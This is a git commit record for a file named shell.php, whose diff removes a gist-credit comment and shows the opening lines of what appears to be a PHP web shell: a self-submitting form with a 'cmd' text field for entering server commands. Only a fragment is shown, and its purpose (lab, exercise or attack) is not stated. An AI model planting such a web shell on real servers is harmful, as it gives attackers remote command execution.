d72700bdb7981551e2f901237774631ab533c793
YUJUNG_CHOI <139779062+Dusker-H@users.noreply.github.com>
2024-11-24 22:43:51 +0900

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,4 +1,3 @@
-// https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985
 <html><body>
 <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
 <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
